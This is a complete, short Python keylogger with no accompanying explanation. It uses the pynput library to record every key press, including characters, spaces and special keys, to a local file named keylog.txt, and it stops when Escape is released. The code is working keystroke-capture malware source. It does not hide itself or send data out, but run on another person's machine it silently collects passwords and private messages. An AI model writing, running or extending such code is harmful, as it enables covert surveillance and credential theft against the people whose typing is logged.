from pynput import keyboard

# File to store the logged keys
log_file = "keylog.txt"

def write_to_file(key):
    try:
        with open(log_file, "a") as f:
            # Format key presses for readability
            if hasattr(key, 'char') and key.char is not None:
                f.write(key.char)  # Log character keys
            elif key == keyboard.Key.space:
                f.write(" ")  # Represent space key with a space
            else:
                f.write(f" [{key}] ")  # Log special keys
    except Exception as e:
        print(f"Error logging key: {e}")

# Listener functions
def on_press(key):
    write_to_file(key)

def on_release(key):
    if key == keyboard.Key.esc:  # Stop listener on 'Escape' key
        return False

# Start listening for key events
with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
